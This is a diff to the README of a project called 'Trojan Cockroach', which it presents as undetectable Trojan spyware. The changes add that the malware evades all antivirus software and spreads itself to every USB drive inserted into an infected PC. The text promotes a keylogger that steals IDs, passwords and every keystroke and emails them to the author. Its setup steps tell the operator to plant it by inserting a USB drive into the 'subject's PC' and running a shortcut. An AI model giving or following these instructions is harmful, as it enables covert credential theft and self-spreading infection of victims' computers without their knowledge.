@@ -1,8 +1,8 @@
-# :smiling_imp: Trojan Cockroach &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[![Gitter](https://badges.gitter.im/MinhasKamal/TrojanCockroach.svg)](https://gitter.im/MinhasKamal/TrojanCockroach?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=body_badge)
+# :smiling_imp: Trojan Cockroach
 
 #### An Undetectable Trojan Spyware
 
-<a href="https://MinhasKamal.github.io/TrojanCockroach">This program</a> is an undetectable **Trojan Virus** that steals data (ID, password; every key stroke) from PC and emails it back to the author. It spreads among PCs through USB drives.
+<a href="https://MinhasKamal.github.io/TrojanCockroach">This program</a> is a **Trojan Virus** that steals data (ID, password; every key stroke) from PC (Windows XP or later) and emails it back to the author. It spreads among PCs through USB drives. It is undetectable by any antivirus software.
 
 ### Setup
 1. Preparation
@@ -14,7 +14,7 @@
 
 2. Attack
   1. Now, insert the USB-Drive in the subject's PC (Yes, you have to start the spreading process from somewhere!)
-  2. Run the shortcut and the spyware will be injected.
+  2. Run the shortcut and the spyware will be injected. Now (after a restart) everytime any USB-Drive is inserted in the affected PC, the virus will copy itself in that, and the circle will start again!
 
 3. Data Collection
   1. You need to wait several days (depending on the number of power on/off of the PC), before getting any data.
